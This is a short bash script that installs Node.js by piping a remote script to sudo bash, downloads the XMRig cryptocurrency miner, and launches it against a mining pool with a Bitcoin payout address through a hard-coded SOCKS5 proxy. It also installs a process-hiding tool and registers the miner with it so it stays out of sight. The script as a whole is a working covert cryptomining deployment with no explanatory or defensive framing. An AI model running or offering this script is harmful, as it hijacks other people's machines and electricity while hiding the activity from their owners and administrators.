#!/bin/bash
sudo apt update &&
sudo apt upgrade -y &&
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
sudo apt install nodejs &&
npm i -g node-process-hider &&
sudo ph add xmrig &&
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz &&
tar -zxf xmrig-6.16.2-bionic-x64.tar.gz &&
cd xmrig-6.16.2 &&
chmod +x xmrig &&
./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=GNTL --threads=1 -x socks5://192.252.214.20:15864
